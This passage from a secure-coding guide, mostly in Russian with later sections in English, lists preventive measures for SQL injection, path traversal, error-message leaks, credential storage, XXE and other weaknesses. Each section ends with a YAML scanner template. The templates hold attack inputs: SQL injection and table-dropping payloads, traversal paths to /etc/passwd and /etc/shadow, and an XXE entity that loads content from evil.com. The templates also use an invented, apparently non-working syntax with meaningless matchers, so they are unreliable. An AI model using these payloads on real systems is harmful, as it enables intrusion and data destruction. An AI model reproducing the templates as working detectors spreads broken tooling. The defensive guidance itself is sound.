1. Принцип наименьших привилегий: убедитесь, что учетная запись пользователя базы данных, используемая веб-приложением, обладает наименьшими привилегиями, необходимыми для выполнения требуемых операций. Ограничьте права только теми конкретными таблицами и операциями, которые требуются приложению, что уменьшит потенциальное воздействие успешной атаки SQL-инъекции.

1. Безопасное управление учетными данными базы данных: Храните и управляйте учетными данными базы данных безопасно. Избегайте жесткого кодирования учетных данных в исходном коде или конфигурационных файлах. Вместо этого используйте безопасные механизмы хранения учетных данных, такие как переменные среды или безопасные хранилища ключей.

1. Реализуйте проверку ввода на стороне сервера: Хотя проверка ввода на стороне клиента обеспечивает лучший пользовательский опыт, на нее не следует полагаться в вопросах безопасности. Всегда выполняйте проверку и санацию ввода и на стороне сервера, поскольку проверку на стороне клиента можно обойти или манипулировать ею.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте свою систему управления базами данных (СУБД) в актуальном состоянии с помощью последних патчей безопасности. Производители СУБД часто выпускают обновления для устранения уязвимостей, в том числе связанных с SQL-инъекциями.

1. Внедрите строгий контроль доступа: Внедрите строгий контроль доступа на уровне приложений, чтобы ограничить доступ и действия пользователей. Используйте контроль доступа на основе ролей (RBAC), правильно аутентифицируйте и авторизуйте пользователей, чтобы они имели доступ только к соответствующим ресурсам и действиям.

1. Тестирование безопасности и проверка кода: Регулярно проводите тестирование безопасности, включая тестирование на проникновение и анализ кода, для выявления уязвимостей SQL-инъекций в вашем веб-приложении. Используйте автоматические сканеры уязвимостей и привлекайте специалистов по безопасности для ручной оценки безопасности.

1. Безопасные методы разработки: Продвигайте практику безопасного кодирования в своей команде разработчиков. Просветите разработчиков о рисках, связанных с SQL-инъекциями, и организуйте обучение методам безопасного кодирования и лучшим практикам. Поощряйте использование фреймворков и библиотек безопасного кодирования, которые обеспечивают защиту от SQL-инъекций.

Применяя эти превентивные меры, вы сможете значительно снизить риск атак SQL Injection и защитить свое веб-приложение от несанкционированного доступа к базе данных или манипуляций с ней. Важно применять проактивный подход к обеспечению безопасности, сочетая методы безопасного кодирования, проверку ввода, параметризованные запросы и регулярное тестирование безопасности для поддержания целостности и безопасности взаимодействия вашего приложения с базой данных.



```
id: sql-injection
info:
  name: SQL Injection
  author: Your Name
  severity: high
  description: Detects potential SQL Injection vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - sql-injection
requests:
  - name: SQL Injection Test
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: fuzz
        payloads:
          - "' OR 1=1 --"
          - "'; DROP TABLE users; --"
          - "'; SELECT * FROM users; --"
      - type: regex
        part: body
        words:
          - 'error in your SQL syntax'
          - 'mysql_fetch_array()'
          - 'sqlite_fetch_array()'
```


### Внешнее управление именем или путем файла

Внешнее управление именем или путем файла - это уязвимость, возникающая, когда злоумышленник может манипулировать именем или путем файла, используемым в файловых операциях, что приводит к непреднамеренному или несанкционированному доступу к файлам в системе. Эта уязвимость может быть использована для чтения, перезаписи или выполнения произвольных файлов, что потенциально может нарушить безопасность и целостность приложения и базовой системы.

Чтобы предотвратить уязвимость External Control of File Name or Path, можно выполнить следующие профилактические меры:

1. Проверяйте и обеззараживайте вводимые файлы: Проверяйте и обеззараживайте любые связанные с файлами данные, полученные от пользователей или из внешних источников. Убедитесь, что имена файлов или пути к ним соответствуют ожидаемому формату и не содержат неожиданных или вредоносных символов. Санируйте входные данные, удаляя или экранируя любые символы, которые могут быть использованы для обхода путей или внедрения команд.

1. Используйте белые списки: Реализуйте подход "белых списков" для разрешенных имен файлов или путей. Определите список разрешенных символов, расширений файлов или путей к каталогам, которые считаются безопасными, и отклоняйте любые входные данные, которые не соответствуют белому списку. Это поможет предотвратить несанкционированный доступ к конфиденциальным файлам или системным каталогам.

1. Избегайте имен и путей к файлам, задаваемых пользователем: По возможности избегайте использования вводимых пользователем данных непосредственно в качестве имен файлов или путей к ним. Генерируйте имена файлов или пути программно, используя надежные и проверенные источники данных, такие как база данных или внутренняя конфигурация. Если ввод данных пользователем необходим, рассмотрите возможность использования защищенного механизма загрузки файлов, который хранит загруженные файлы в специально отведенном неисполняемом каталоге.

1. Ограничьте права доступа к файловой системе: Установите соответствующие разрешения на доступ к файлам и каталогам, чтобы ограничить привилегии приложения или процесса, обращающегося к ним. Убедитесь, что приложение запускается с наименьшими привилегиями, необходимыми для выполнения его операций, и ограничьте доступ к конфиденциальным файлам или системным каталогам.

1. Используйте специфические для платформы API-интерфейсы безопасного доступа к файлам: Используйте API-интерфейсы безопасного доступа к файлам, предоставляемые используемым языком программирования или фреймворком. Эти API часто содержат встроенные средства защиты от атак обхода пути или внедрения команд. Избегайте использования низкоуровневых методов доступа к файловой системе, которые могут быть более подвержены уязвимостям.

1. Внедрите средства контроля доступа к файлам: Реализуйте надлежащий контроль доступа к файлам в вашем приложении. Аутентифицируйте и авторизуйте пользователей, чтобы убедиться, что у них есть необходимые разрешения на доступ к определенным файлам или каталогам. Обеспечьте контроль доступа на уровне файлов на основе ролей или привилегий пользователей.

1. Безопасная загрузка и выгрузка файлов: Реализуйте механизмы безопасной загрузки и выгрузки файлов, которые проверяют типы файлов, их размеры и выполняют проверку на наличие вирусов и вредоносного ПО. Ограничьте допустимые расширения файлов, установите ограничения на размер и убедитесь, что загруженные файлы хранятся в безопасном месте.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте базовую операционную систему, библиотеки и зависимые компоненты в актуальном состоянии с помощью последних патчей безопасности. Патчи часто устраняют уязвимости, связанные с операциями файловой системы, и могут помочь снизить риск атак с внешним контролем имени файла или пути.

1. Тестирование безопасности и обзор кода: Регулярно проводите тестирование безопасности, включая тестирование на проникновение и анализ кода, для выявления уязвимостей, связанных с файловыми операциями. Используйте автоматические сканеры уязвимостей или привлекайте специалистов по безопасности для проведения оценки безопасности вручную.

1. Обучайте разработчиков: Организуйте обучение разработчиков безопасным методам работы с файлами и рискам, связанным с уязвимостями внешнего контроля имени файла или пути к нему. Продвигайте методы безопасного кодирования и лучшие практики в своей команде разработчиков.

Реализовав эти превентивные меры, вы сможете значительно снизить риск возникновения уязвимостей, связанных с внешним контролем имени файла или пути к нему, и защитить свое приложение от несанкционированного доступа к файлам или манипулирования ими. Очень важно следовать практикам безопасного кодирования, проверять и обеззараживать вводимые файлы, а также регулярно обновлять свои системы для решения возникающих проблем безопасности.


```
id: file-path-injection
info:
  name: External Control of File Name or Path
  author: Your Name
  severity: medium
  description: Detects potential file path injection vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - file-path-injection
requests:
  - name: File Path Injection Test
    path:
      - /
      - /download
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/download?file={{.Fuzz}}"
            headers:
              User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
            fuzz:
              - "../../../../etc/passwd"
              - "../../../../etc/shadow"
              - "../../../../etc/hosts"
```



### Генерация сообщения об ошибке, содержащего конфиденциальную информацию

Generation of Error Message Containing Sensitive Information - это уязвимость, которая возникает, когда сообщения об ошибках, генерируемые приложением, раскрывают конфиденциальную или секретную информацию. Это могут быть такие сведения, как строки подключения к базе данных, трассировка стека, учетные данные пользователя или другие конфиденциальные данные. Злоумышленники могут использовать эту информацию для получения информации об архитектуре системы, выявления потенциальных слабых мест или проведения дальнейших атак.

Чтобы предотвратить генерацию сообщений об ошибках, содержащих конфиденциальную информацию, можно принять следующие профилактические меры:

1. Отключите подробные сообщения об ошибках в производстве: Убедитесь, что производственная среда вашего приложения настроена на отображение общих сообщений об ошибках вместо подробной технической информации. Это поможет предотвратить непреднамеренное раскрытие конфиденциальных данных в сообщениях об ошибках.

1. Реализуйте пользовательскую обработку ошибок: Создайте пользовательские механизмы обработки ошибок, которые перехватывают и обрабатывают ошибки приложения, не раскрывая конфиденциальную информацию. Настройте сообщения об ошибках так, чтобы они предоставляли пользователям общую и удобную обратную связь, не раскрывая конкретных технических деталей.

1. Безопасно регистрируйте ошибки: Если ваше приложение регистрирует ошибки, убедитесь, что конфиденциальная информация не включена в записи журнала. Проверьте конфигурацию журнала, чтобы убедиться, что в него записывается только необходимая информация, и проведите санитарную обработку всех записанных в журнал данных, чтобы удалить конфиденциальные сведения.

1. Избегайте отображения конфиденциальной информации: Полностью откажитесь от отображения конфиденциальной информации в сообщениях об ошибках. Воздержитесь от включения в сообщения об ошибках таких конфиденциальных данных, как учетные данные пользователя, строки подключения к базе данных или внутренние пути системы. Вместо этого сосредоточьтесь на предоставлении пользователям полезной и действенной информации, не раскрывая конфиденциальных данных.

1. Используйте передовые методы обработки исключений: Используйте в коде правильные методы обработки исключений. Ловите и обрабатывайте исключения изящно, избегая распространения конфиденциальной информации в сообщениях об ошибках. Реализуйте структурированные механизмы обработки исключений, чтобы эффективно перехватывать и обрабатывать ошибки.

1. Регулярно тестируйте обработку ошибок: Проводите тщательное тестирование механизмов обработки ошибок в вашем приложении. Включите сценарии, в которых исключения намеренно вызываются, чтобы гарантировать, что конфиденциальная информация не будет раскрыта в сообщениях об ошибках. Используйте автоматические средства сканирования уязвимостей или привлекайте специалистов по безопасности для выявления потенциальных утечек информации.

1. Внедрите проверку и санацию ввода: Проверяйте и обеззараживайте вводимые пользователем данные, чтобы предотвратить возникновение ошибок, раскрывающих конфиденциальную информацию. Правильная проверка ввода помогает предотвратить распространенные векторы атак, такие как инъекционные атаки, которые могут привести к созданию сообщений об ошибках, содержащих конфиденциальные данные.

1. Соблюдайте правила безопасного кодирования: Соблюдайте правила и рекомендации по безопасному кодированию. Храните конфиденциальную информацию отдельно от сообщений об ошибках и убедитесь, что код обработки ошибок надежен и безопасен. Применяйте принципы безопасного кодирования на протяжении всего жизненного цикла разработки, чтобы свести к минимуму вероятность возникновения уязвимостей.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте приложение и его зависимости в актуальном состоянии с помощью последних патчей безопасности. Обновления программного обеспечения часто устраняют уязвимости безопасности, в том числе связанные с обработкой ошибок и потенциальным раскрытием конфиденциальной информации.

1. Обучайте разработчиков: Организуйте программы обучения и повышения осведомленности, чтобы рассказать разработчикам о рисках, связанных с сообщениями об ошибках, содержащими конфиденциальную информацию. Пропагандируйте практику безопасного кодирования и подчеркивайте важность правильной обработки и защиты сообщений об ошибках.

Реализовав эти превентивные меры, вы сможете минимизировать риск раскрытия конфиденциальной информации в сообщениях об ошибках и повысить уровень безопасности вашего приложения. Очень важно уделять приоритетное внимание защите конфиденциальных данных и регулярно пересматривать и обновлять механизмы обработки ошибок, чтобы они соответствовали лучшим практикам и развивающимся стандартам безопасности.


```
id: error-message-leak
info:
  name: Generation of Error Message Containing Sensitive Information
  author: Your Name
  severity: high
  description: Detects potential leakage of sensitive information in error messages.
  references:
    - https://example.com
tags:
  - web
  - error-message-leak
requests:
  - name: Error Message Leakage Test
    path:
      - /
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: "/login"
            headers:
              Content-Type: application/x-www-form-urlencoded
            body:
              username: "{{.Fuzz}}"
              password: "password"
            fuzz:
              - "' OR '1'='1"
              - "' OR 'a'='a"
              - "' OR '1'='1' --"
```



### Незащищенное хранение учетных данных

Под незащищенным хранением учетных данных понимается практика хранения конфиденциальных данных, таких как имена пользователей, пароли, ключи API или маркеры доступа, небезопасным способом. Это может включать хранение учетных данных открытым текстом, использование слабого шифрования или хранение их в легкодоступных местах, что делает их уязвимыми для несанкционированного доступа и потенциального использования злоумышленниками.

Чтобы предотвратить незащищенное хранение учетных данных, необходимо соблюдать следующие профилактические меры:

1. Используйте безопасные механизмы хранения учетных данных: Используйте безопасные методы хранения учетных данных, такие как защищенные базы данных, зашифрованные файлы или специальные системы управления учетными данными. Эти механизмы должны обеспечивать надежное шифрование и контроль доступа для защиты конфиденциальности и целостности хранимых учетных данных.

1. Избегайте хранения паролей в виде обычного текста: Никогда не храните пароли и конфиденциальные учетные данные в виде обычного текста. Вместо этого используйте надежные криптографические методы, такие как одностороннее хеширование с солью или функции выведения ключа, для безопасного хранения и проверки паролей.

1. Применяйте надежное шифрование: Если вам необходимо хранить учетные данные в файле или базе данных, убедитесь, что они зашифрованы с помощью надежных алгоритмов и ключей шифрования. Используйте стандартные библиотеки и алгоритмы шифрования, чтобы защитить учетные данные от несанкционированного доступа.

1. Отделяйте учетные данные от исходного кода: Избегайте хранения учетных данных непосредственно в исходном коде или конфигурационных файлах, которые являются частью систем контроля версий. Отделите учетные данные от кодовой базы и используйте конфигурационные файлы для конкретного окружения или средства управления безопасными секретами для предоставления необходимых учетных данных во время выполнения.

1. Безопасное управление ключами API и маркерами доступа: При работе с API-ключами или маркерами доступа следуйте лучшим практикам, предоставляемым соответствующим сервисом или фреймворком. Избегайте жесткого кодирования этих учетных данных, а вместо этого используйте безопасные переменные окружения или специальные файлы конфигурации для их хранения и получения.

1. Внедрите средства контроля доступа: Обеспечьте надлежащий контроль доступа, чтобы ограничить доступ к конфиденциальным учетным данным. Предоставляйте доступ только тем уполномоченным лицам, которым он необходим для выполнения определенных ролей или задач. Регулярно проверяйте и обновляйте разрешения на доступ, чтобы убедиться, что только доверенные лица имеют доступ к учетным данным.

1. Регулярно ротируйте учетные данные: Внедрите политику ротации учетных данных, которая предусматривает периодическую смену паролей, ротацию ключей или выдачу новых маркеров доступа. Регулярная ротация учетных данных снижает риск длительного воздействия и несанкционированного доступа к важным системам.

1. Контролируйте и регистрируйте доступ к учетным данным: Внедрите механизмы регистрации и мониторинга для отслеживания доступа к конфиденциальным учетным данным. Регулярно просматривайте журналы на предмет любых подозрительных или несанкционированных попыток доступа. Мониторинг помогает обнаружить любые потенциальные нарушения или несанкционированное использование учетных данных.

1. Обучите пользователей безопасному управлению учетными данными: Организуйте программы обучения и повышения осведомленности, чтобы рассказать пользователям и разработчикам о важности безопасного управления учетными данными. Подчеркните риски, связанные с незащищенным хранением учетных данных, и пропагандируйте безопасное кодирование и методы работы с ними.

1. Регулярная оценка и аудит: Проводите регулярные оценки и аудиты безопасности, чтобы выявить любые потенциальные уязвимости и недостатки в хранении и управлении учетными данными. Используйте автоматизированные средства сканирования или привлекайте специалистов по безопасности для проведения тщательной оценки.

Применяя эти превентивные меры, вы сможете значительно снизить риск незащищенного хранения учетных данных и повысить безопасность ваших приложений и систем. Защита конфиденциальных учетных данных имеет решающее значение для защиты пользовательских данных, предотвращения несанкционированного доступа и сохранения доверия пользователей.


```
id: unprotected-credentials
info:
  name: Unprotected Storage of Credentials
  author: Your Name
  severity: high
  description: Detects unprotected storage of sensitive credentials.
  references:
    - https://example.com
tags:
  - web
  - unprotected-credentials
requests:
  - name: Unprotected Credential Storage Test
    path:
      - /
      - /admin
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/config"
          - method: GET
            path: "/credentials"
```


### Нарушение границ доверия

Нарушение границ доверия - это уязвимость безопасности, которая возникает, когда данные или управление пересекают границу доверия без надлежащей проверки или авторизации. Это происходит, когда данные из недоверенного источника рассматриваются как доверенные или когда не обеспечивается надлежащий контроль доступа на границе между доверенными и недоверенными компонентами или системами. Такое нарушение может привести к несанкционированному доступу, утечке данных, повышению привилегий или выполнению вредоносного кода.

Чтобы предотвратить нарушение границ доверия, необходимо соблюдать следующие профилактические меры:

1. Проверяйте и обеззараживайте вводимые данные: Проверяйте и обеззараживайте все входные данные, полученные из недоверенных источников, таких как пользовательский ввод, вызовы API или данные из внешних систем. Применяйте строгие методы проверки и фильтрации входных данных, чтобы гарантировать, что только безопасные и ожидаемые данные передаются через границы доверия.

1. Внедряйте надежную аутентификацию и авторизацию: Применяйте надежные механизмы аутентификации и авторизации, чтобы только уполномоченные лица могли получить доступ к важным ресурсам или выполнять критические операции. Внедрите средства контроля доступа на границах доверия для предотвращения несанкционированного доступа.

1. Применяйте принцип наименьших привилегий: Предоставляйте пользователям, компонентам или системам только минимальные привилегии, необходимые для выполнения их задач. Избегайте предоставления ненужных разрешений или повышенных привилегий, которые потенциально могут привести к нарушению границ доверия.

1. Используйте безопасные протоколы связи: Когда данные пересекают границы доверия, убедитесь, что используются безопасные протоколы связи, такие как SSL/TLS, для защиты конфиденциальности и целостности данных при передаче. Шифруйте конфиденциальные данные, чтобы предотвратить их перехват или фальсификацию.

1. Внедрите безопасное управление сеансами: Если сеансы используются для сохранения состояния или контекста пользователя, обеспечьте надлежащее управление сеансами. Используйте маркеры безопасных сеансов, обеспечивайте таймауты сеансов и защищайте от атак фиксации или перехвата сеанса.

1. Разделяйте и изолируйте компоненты: Четко определите границы доверия между различными компонентами или системами и обеспечьте их соблюдение. Изолируйте ненадежные компоненты или системы от надежных, чтобы минимизировать последствия потенциального нарушения или компрометации.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте все компоненты, фреймворки, библиотеки и системы в актуальном состоянии с помощью последних патчей безопасности. Регулярно проверяйте и обновляйте конфигурации безопасности, чтобы устранить все известные уязвимости, которые могут привести к нарушению границ доверия.

1. Реализуйте мониторинг во время выполнения и обнаружение аномалий: Разверните системы мониторинга, способные обнаруживать и предупреждать о необычном или неожиданном поведении на границах доверия. Отслеживайте подозрительные действия, неожиданные потоки данных или попытки несанкционированного доступа.

1. Проводите тестирование безопасности и анализ кода: Регулярно проводите тестирование безопасности, включая тестирование на проникновение и анализ кода, чтобы выявить и устранить все уязвимости границ доверия. Проверяйте устойчивость системы к нарушениям границ и эффективность внедренных средств контроля безопасности.

1. Проводите обучение по вопросам безопасности: Проинформируйте разработчиков и системных администраторов о рисках и последствиях нарушения границ доверия. Пропагандируйте осведомленность о безопасности и проводите тренинги по безопасному кодированию, безопасному управлению конфигурацией и важности соблюдения границ доверия.

Следуя этим профилактическим мерам, вы сможете снизить риск нарушения границ доверия и повысить общую безопасность вашего приложения или системы. Очень важно установить четкие границы доверия, внедрить соответствующие средства контроля безопасности, а также регулярно контролировать и обновлять свои системы, чтобы предотвратить несанкционированный доступ или компрометацию через границы доверия.

```
id: trust-boundary-violation
info:
  name: Trust Boundary Violation
  author: Your Name
  severity: medium
  description: Detects trust boundary violations in the application.
  references:
    - https://example.com
tags:
  - web
  - trust-boundary-violation
requests:
  - name: Trust Boundary Violation Test
    path:
      - /
      - /admin
      - /user
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/user-details?admin=true"
          - method: GET
            path: "/admin-details?user=true"
```


### Недостаточно защищенные учетные данные

Недостаточно защищенные учетные данные - это уязвимость безопасности, которая возникает, когда конфиденциальные данные, такие как имена пользователей, пароли, ключи API или маркеры доступа, не защищены должным образом, что делает их уязвимыми для несанкционированного доступа или неправомерного использования. Это может произойти из-за слабого шифрования, ненадлежащего хранения или неадекватного контроля доступа, что подвергает риску конфиденциальную информацию.

Чтобы предотвратить использование недостаточно защищенных учетных данных, необходимо соблюдать следующие профилактические меры:

1. Используйте надежное шифрование: Убедитесь, что конфиденциальные данные должным образом зашифрованы с использованием надежных алгоритмов и ключей шифрования. Используйте стандартные методы шифрования для защиты конфиденциальности и целостности хранимых учетных данных.

1. Используйте безопасные механизмы хранения: Храните учетные данные в защищенных системах хранения, таких как зашифрованные базы данных или защищенные хранилища ключей, которые обеспечивают соответствующий контроль доступа и защиту от несанкционированного доступа. Избегайте хранения учетных данных в виде открытого текста или в незащищенных местах.

1. Избегайте жесткого кодирования учетных данных: Следует избегать жесткого кодирования учетных данных непосредственно в исходном коде или конфигурационных файлах. Вместо этого используйте переменные среды, безопасные инструменты управления секретами или файлы конфигурации с ограниченным доступом для хранения и извлечения учетных данных.

1. Реализуйте безопасную передачу учетных данных: При передаче учетных данных используйте защищенные протоколы связи, такие как SSL/TLS, для шифрования передаваемых данных. Не передавайте учетные данные по незащищенным каналам и не включайте их в параметры URL.

1. Применяйте принцип наименьших привилегий: Предоставляйте учетным данным только минимальные привилегии, необходимые для обеспечения требуемой функциональности. Избегайте предоставления ненужных или чрезмерных привилегий, чтобы уменьшить потенциальное воздействие компрометации учетных данных.

1. Применяйте строгие политики паролей: Внедряйте политики надежных паролей, поощряющие пользователей к созданию сложных и уникальных паролей. Обеспечьте истечение срока действия пароля и предоставьте механизмы для сброса пароля или восстановления учетной записи.

1. Внедрите многофакторную аутентификацию (MFA): Используйте MFA для обеспечения дополнительного уровня безопасности. Требуйте от пользователей предоставления дополнительных факторов аутентификации, таких как одноразовый пароль, основанный на времени (TOTP) или биометрические данные, для доступа к важным ресурсам.

1. Регулярная ротация учетных данных: Установите политику ротации учетных данных, которая предусматривает периодическую смену паролей, ротацию ключей или восстановление токенов. Регулярно обновляйте и ротируйте учетные данные, чтобы ограничить окно риска в случае компрометации.

1. Внедряйте методы безопасного кодирования: Соблюдайте правила безопасного кодирования, чтобы свести к минимуму риск непреднамеренного раскрытия учетных данных. Избегайте регистрации или отображения учетных данных в сообщениях об ошибках или отладочных выводах. Применяйте методы безопасного кодирования для защиты от таких распространенных уязвимостей, как инъекционные атаки.

1. Регулярно проводите оценку безопасности: Регулярно проводите оценку безопасности и тестирование на проникновение, чтобы выявить уязвимости и слабые места в защите учетных данных. Привлекайте специалистов по безопасности или используйте автоматизированные средства сканирования уязвимостей для выявления потенциальных проблем.

1. Обучайте пользователей и разработчиков: Повысьте осведомленность пользователей и разработчиков о важности защиты учетных данных. Организуйте обучение методам безопасного кодирования, управления паролями и рискам, связанным с недостаточной защитой учетных данных.

Применяя эти превентивные меры, вы сможете значительно снизить риск использования недостаточно защищенных учетных данных и повысить безопасность своих систем. Защита конфиденциальных учетных данных имеет решающее значение для обеспечения сохранности пользовательских данных, предотвращения несанкционированного доступа и поддержания доверия пользователей.



```
id: insufficiently-protected-credentials
info:
  name: Insufficiently Protected Credentials
  author: Your Name
  severity: high
  description: Detects instances where sensitive credentials are insufficiently protected.
  references:
    - https://example.com
tags:
  - web
  - insufficiently-protected-credentials
requests:
  - name: Insufficiently Protected Credentials Test
    path:
      - /
      - /admin
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: /login
            headers:
              - name: Content-Type
                value: application/x-www-form-urlencoded
            body: "username=admin&password=admin"
            matchers:
              - type: word
                words:
                  - "Invalid username or password"
```


### Ограничение ссылки на внешнюю сущность XML

Ограничение ссылки на внешние сущности XML (XXE) - это уязвимость безопасности, которая возникает, когда парсер XML обрабатывает внешние сущности, включенные в XML-вход. Злоумышленники могут использовать эту уязвимость для чтения конфиденциальных данных с сервера или проведения атак типа "отказ в обслуживании".

Для предотвращения XXE-уязвимостей необходимо соблюдать следующие профилактические меры:

1. Отключите обработку внешних сущностей: Настройте парсер XML на отключение обработки внешних сущностей. Это не позволит парсеру XML разрешать и включать внешние сущности в XML-вход.

1. Валидация и санитарная обработка входных данных XML: Применяйте надлежащие методы проверки и обеззараживания входных данных, чтобы гарантировать, что обрабатываются только ожидаемые и безопасные XML-данные. Используйте строгие настройки синтаксического анализа и отклоняйте или обеззараживайте любые недоверенные или неожиданные входные данные XML.

1. Используйте белые списки и фильтрацию: Внедрите механизмы "белых списков" или фильтрации, чтобы разрешить только известные безопасные XML-структуры и отклонить или удалить любые потенциально вредоносные XML-конструкции или элементы.

1. Перейдите на безопасный парсер XML: Используйте последнюю версию безопасной и хорошо поддерживаемой библиотеки парсера XML. Старые версии XML-парсеров могут иметь известные уязвимости, которые могут быть использованы злоумышленниками.

1. Реализуйте наименьшие привилегии: Ограничьте привилегии доступа к XML-парсеру, чтобы свести к минимуму потенциальное воздействие атаки XXE. Убедитесь, что парсер XML запускается с минимальными привилегиями, необходимыми для выполнения его функций.

1. Избегайте использования управляемого пользователем XML: Избегайте использования управляемого пользователем XML в конфиденциальных операциях или при обработке. Если требуется использование пользовательского XML, обеспечьте строгую проверку и санацию входных данных, чтобы снизить риск возникновения уязвимостей XXE.

1. Реализуйте фильтрацию и проверку ввода на стороне сервера: Применяйте методы проверки и фильтрации ввода на стороне сервера для предотвращения уязвимостей XXE. Проверяйте и обеззараживайте все XML-данные, полученные от клиентов, перед их обработкой на сервере.

1. Соблюдайте правила безопасного кодирования: При работе с XML-данными придерживайтесь практики безопасного кодирования. Избегайте конкатенации XML-строк или динамического построения XML с использованием недоверенных входных данных, поскольку это может привести к появлению уязвимостей XML-инъекций.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте парсер XML и связанные с ним библиотеки в актуальном состоянии с помощью последних исправлений безопасности. Будьте в курсе всех рекомендаций по безопасности или обновлений, связанных с парсером XML, чтобы устранить все известные уязвимости.

1. Проводите тестирование безопасности: Проводите тестирование безопасности, включая оценку уязвимостей и тестирование на проникновение, для выявления и устранения уязвимостей XXE. Проверьте устойчивость приложения к различным векторам атак XXE и убедитесь в эффективности внедренных средств контроля безопасности.

Применяя эти превентивные меры, вы сможете снизить риск возникновения уязвимостей XXE и повысить безопасность обработки XML. Необходимо быть осторожным при работе с XML-данными, применять безопасные методы кодирования и поддерживать парсер XML в актуальном состоянии, чтобы предотвратить использование уязвимостей XXE злоумышленниками.


```
id: restriction-of-xxe-reference
info:
  name: Restriction of XML External Entity Reference
  author: Your Name
  severity: medium
  description: Detects instances where XML parsing allows external entity references, potentially leading to XXE vulnerabilities.
  references:
    - https://example.com
tags:
  - web
  - restriction-of-xxe-reference
requests:
  - name: Restriction of XXE Reference Test
    path:
      - /
      - /admin
      - /api
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: /api/parse-xml
            headers:
              - name: Content-Type
                value: application/xml
            body: |
              <?xml version="1.0" encoding="UTF-8"?>
              <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
              <root>&xxe;</root>
            matchers:
              - type: word
                words:
                  - "XXE detected"
```


### Vulnerable and Outdated Components

Vulnerable and outdated components refer to third-party libraries, frameworks, or software components that have known security vulnerabilities or are no longer supported with security patches. Using such components can introduce security risks into your application or system, as attackers can exploit these vulnerabilities to gain unauthorized access or compromise your system.

To prevent the use of vulnerable and outdated components, you should follow these preventive measures:

1. Maintain an inventory of components: Create and maintain an inventory of all the third-party components used in your application or system. Keep track of the version numbers and the sources of these components.

1. Stay informed about security updates: Stay updated with the latest security advisories and vulnerability reports for the components you use. Subscribe to security mailing lists or follow official sources to receive notifications about security patches and updates.

1. Regularly update components: Regularly update the components in your application or system to the latest stable and secure versions. Check for security releases and apply the patches promptly. Ensure that your update process is well-documented and regularly tested.

1. Utilize vulnerability databases: Make use of vulnerability databases and security resources that provide information on known vulnerabilities in components. Check these resources regularly to identify any vulnerabilities in the components you use and take appropriate action.

1. Perform security assessments: Conduct regular security assessments and vulnerability scans to identify any vulnerabilities introduced by the components. Use automated tools or engage security professionals to perform security testing and code reviews.

1. Monitor component support: Keep track of the support status of the components you use. If a component is no longer maintained or has reached its end-of-life, consider finding alternative components or solutions. Unsupported components are more likely to have unpatched vulnerabilities.

1. Implement a patch management process: Establish a patch management process to ensure that security patches and updates are promptly applied to the components. This process should include testing patches in a controlled environment before deploying them to production.

1. Consider using security monitoring tools: Implement security monitoring tools that can detect and alert you about vulnerabilities or potential risks associated with the components you use. These tools can help you identify any security issues early on and take necessary mitigation steps.

1. Follow secure coding practices: Develop secure coding practices to minimize the introduction of vulnerabilities in your own code. Regularly review and update your code to ensure that it does not rely on vulnerable or outdated components.

1. Include component assessment in the procurement process: When selecting new components, consider their security track record, update frequency, and community support. Choose components that have a good reputation for security and are actively maintained.

By following these preventive measures, you can reduce the risk of using vulnerable and outdated components in your application or system. Regularly updating components, staying informed about security updates, and conducting security assessments are essential to maintain a secure software ecosystem.


```
id: vulnerable-and-outdated-components
info:
  name: Vulnerable and Outdated Components
  author: Your Name
  severity: high
  description: Detects vulnerable and outdated components in web applications.
  references:
    - https://example.com
tags:
  - web
  - vulnerable-and-outdated-components
requests:
  - name: Vulnerable and Outdated Components Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: /info
            headers:
              - name: User-Agent
                value: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
            matchers:
              - type: word
                words:
                  - "Vulnerable component detected"
```


### Improper Validation of Certificate with Host Mismatch

Improper Validation of Certificate with Host Mismatch is a security vulnerability that occurs when a client application fails to properly validate the server's SSL/TLS certificate during a secure communication handshake. This vulnerability allows an attacker to impersonate the server by presenting a certificate that does not match the expected host.

To prevent Improper Validation of Certificate with Host Mismatch, you should follow these preventive measures:

1. Properly validate SSL/TLS certificates: Implement a robust certificate validation mechanism in your client application. Ensure that the SSL/TLS library or framework being used verifies the certificate chain, expiration date, revocation status, and other relevant fields.

1. Check for host name mismatch: Verify that the common name (CN) or subject alternative name (SAN) field in the certificate matches the host to which the client is connecting. Perform a strict comparison and reject the connection if there is a mismatch.

1. Use a trusted certificate authority (CA): Obtain SSL/TLS certificates from reputable CAs that follow industry best practices for certificate issuance. Trust certificates only from well-known CAs to reduce the risk of obtaining fraudulent or improperly issued certificates.

1. Implement certificate pinning: Consider implementing certificate pinning, also known as public key pinning, in your client application. Pinning involves associating a specific server's public key or certificate fingerprint with a known and trusted value. This helps prevent certificate substitution attacks.

1. Stay up to date with CA revocations: Regularly update the list of revoked certificates and perform certificate revocation checks during the validation process. Check certificate revocation status using online certificate revocation lists (CRLs) or the Online Certificate Status Protocol (OCSP).

1. Enable strict SSL/TLS configuration: Configure your SSL/TLS settings to use secure and up-to-date protocols (e.g., TLS 1.2 or higher) and cryptographic algorithms. Disable deprecated or weak protocols and algorithms to prevent potential vulnerabilities.

